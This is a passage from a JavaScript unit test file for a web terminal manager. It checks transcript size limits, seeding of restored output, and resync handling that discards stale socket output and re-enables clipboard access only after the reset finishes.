        assert.deepEqual(clipboardActivations, []);
        writeCallbacks[0]();
        assert.deepEqual(clipboardActivations, []);
        writeCallbacks[1]();
        assert.deepEqual(clipboardActivations, [terminal]);
    } finally {
        global.document.getElementById = originalGetElementById;
        global.requestAnimationFrame = originalRequestAnimationFrame;
        TerminalManager.setupScrollbar = originalSetupScrollbar;
        TerminalManager.fitTerminal = originalFitTerminal;
        TerminalManager.registerOsc52ClipboardHandler = originalRegisterOsc52ClipboardHandler;
        console.error = originalConsoleError;
    }
});

test('attachTerminal replays the current bounded transcript after pending trims', async () => {
    const originalGetElementById = global.document.getElementById;
    const originalRequestAnimationFrame = global.requestAnimationFrame;
    const originalSetupScrollbar = TerminalManager.setupScrollbar;
    const originalFitTerminal = TerminalManager.fitTerminal;
    const originalRegisterOsc52ClipboardHandler = TerminalManager.registerOsc52ClipboardHandler;
    const originalConsoleError = console.error;
    const originalTranscriptLimit = TerminalManager.maxTranscriptSize;
    const originalPendingLimit = TerminalManager.maxPendingOutputSize;
    const writes = [];
    const writeCallbacks = [];
    const accepted = [];
    const terminal = {
        buffer: { active: { viewportY: 0, baseY: 0 } },
        open() {},
        clear() {},
        write(data, callback) {
            writes.push(data);
            writeCallbacks.push(callback);
        },
        scrollToBottom() {},
    };

    try {
        TerminalManager.maxTranscriptSize = 5;
        TerminalManager.maxPendingOutputSize = 5;
        TerminalManager.terminals = {};
        TerminalManager.sessionTerminals = {};
        TerminalManager.pendingOutput = {};
        TerminalManager.pendingOutputSizes = {};
        TerminalManager.terminalReady = {};
        TerminalManager.clipboardDisposers = {};
        TerminalManager.transcripts = {};
        TerminalManager.transcriptSizes = {};
        console.error = () => {};

        TerminalManager.writeOutput('bounded-session', 'old');
        TerminalManager.terminals.boundedTerminal = terminal;
        TerminalManager.sessionTerminals['bounded-session'] = [
            'boundedTerminal'
        ];
        global.document.getElementById = () => ({ appendChild() {} });
        global.requestAnimationFrame = callback => callback();
        TerminalManager.setupScrollbar = () => {};
        TerminalManager.fitTerminal = () => {};
        TerminalManager.registerOsc52ClipboardHandler = () => ({
            dispose() {}
        });

        TerminalManager.attachTerminal(
            'bounded-session',
            'terminal-container',
            'boundedTerminal',
        );
        TerminalManager.writeOutput(
            'bounded-session', '1234', null,
            () => accepted.push('first'),
        );
        TerminalManager.writeOutput(
            'bounded-session', '5678', null,
            () => accepted.push('second'),
        );

        assert.deepEqual(accepted, ['first']);
        await new Promise(resolve => setTimeout(resolve, 80));

        assert.equal(
            TerminalManager.transcripts['bounded-session'].join(''),
            '5678',
        );
        assert.deepEqual(writes, ['5678']);
        assert.deepEqual(accepted, ['first']);
        writeCallbacks[0]();
        assert.deepEqual(accepted, ['first', 'second']);
    } finally {
        TerminalManager.maxTranscriptSize = originalTranscriptLimit;
        TerminalManager.maxPendingOutputSize = originalPendingLimit;
        global.document.getElementById = originalGetElementById;
        global.requestAnimationFrame = originalRequestAnimationFrame;
        TerminalManager.setupScrollbar = originalSetupScrollbar;
        TerminalManager.fitTerminal = originalFitTerminal;
        TerminalManager.registerOsc52ClipboardHandler = originalRegisterOsc52ClipboardHandler;
        console.error = originalConsoleError;
    }
});

test('restored output is seeded before attach without duplicating overlapping live output', () => {
    TerminalManager.transcripts = {};
    TerminalManager.transcriptSizes = {};
    TerminalManager.sequencedOutput = {};
    TerminalManager.lastOutputSequences = {};
    TerminalManager.writeOutput('restored', 'switch# show version\r\n', 7);

    TerminalManager.seedRestoredOutput(
        'restored',
        'boot complete\r\nswitch# show version\r\n',
        7,
    );

    assert.equal(
        TerminalManager.transcripts.restored.join(''),
        'boot complete\r\nswitch# show version\r\n',
    );

    TerminalManager.writeOutput('restored', 'switch# ', 8);
    TerminalManager.seedRestoredOutput('restored', 'older snapshot\r\nswitch# ', 7);

    assert.equal(
        TerminalManager.transcripts.restored.join(''),
        'older snapshot\r\nswitch# switch# ',
    );

    TerminalManager.writeOutput('restored', 'duplicate snapshot event', 7);
    assert.equal(TerminalManager.getTranscript('restored'), 'older snapshot\r\nswitch# switch# ');

    TerminalManager.seedRestoredOutput('restored', '', 8);
    assert.equal(TerminalManager.getTranscript('restored'), '');
});

test('resync rebuilds ready terminals without accepting stale socket output', () => {
    const originalRegisterOsc52ClipboardHandler = (
        TerminalManager.registerOsc52ClipboardHandler
    );
    const writes = [];
    const writeCallbacks = [];
    const events = [];
    const terminal = {
        buffer: {active: {viewportY: 0, baseY: 0}},
        element: {closest: () => ({classList: {contains: () => false}})},
        reset() { events.push('reset'); },
        write(data, callback) {
            writes.push(data);
            writeCallbacks.push(callback);
        },
        scrollToBottom() {},
    };

    try {
        TerminalManager.terminals = {resyncTerminal: terminal};
        TerminalManager.terminalReady = {resyncTerminal: true};
        TerminalManager.sessionTerminals = {
            resync: ['resyncTerminal'],
        };
        TerminalManager.pendingOutput = {};
        TerminalManager.pendingOutputSizes = {};
        TerminalManager.terminalWriteCallbacks = {};
        TerminalManager.clipboardDisposers = {
            resyncTerminal: {
                dispose() { events.push('clipboard-disposed'); },
            },
        };
        TerminalManager.osc52ClipboardAllowed = {resyncTerminal: true};
        TerminalManager.transcripts = {resync: ['stale']};
        TerminalManager.transcriptSizes = {resync: 5};
        TerminalManager.sequencedOutput = {
            resync: [{sequence: 12, data: ' live'}],
        };
        TerminalManager.sequencedOutputSizes = {resync: 5};
        TerminalManager.lastOutputSequences = {resync: 12};
        TerminalManager.registerOsc52ClipboardHandler = target => {
            events.push(target === terminal ? 'clipboard-active' : 'wrong-terminal');
            return {dispose() {}};
        };

        let staleAccepted = 0;
        TerminalManager.writeOutputToTerminal(
            'resyncTerminal',
            'old socket output',
            () => { staleAccepted += 1; },
        );
        TerminalManager.resyncRestoredOutput('resync', 'snapshot', 11);
        let newOutputAccepted = 0;
        TerminalManager.writeOutput(
            'resync',
            ' after',
            13,
            () => { newOutputAccepted += 1; },
        );

        assert.deepEqual(writes, ['old socket output', '']);
        assert.deepEqual(events, ['clipboard-disposed']);
        assert.equal(staleAccepted, 0);
        assert.equal(newOutputAccepted, 0);

        writeCallbacks[0]();
        assert.equal(staleAccepted, 0);
        assert.deepEqual(events, ['clipboard-disposed']);

        writeCallbacks[1]();
        assert.deepEqual(writes, [
            'old socket output',
            '',
            'snapshot live after',
        ]);
        assert.deepEqual(events, ['clipboard-disposed', 'reset']);
        assert.equal(newOutputAccepted, 0);

        writeCallbacks[2]();
        assert.deepEqual(events, [
            'clipboard-disposed',
            'reset',
            'clipboard-active',
        ]);
        assert.equal(newOutputAccepted, 1);
        assert.equal(
            TerminalManager.terminalWriteCallbacks.resyncTerminal.size,
            0,
        );
    } finally {
        TerminalManager.registerOsc52ClipboardHandler = (
            originalRegisterOsc52ClipboardHandler
        );
    }
});
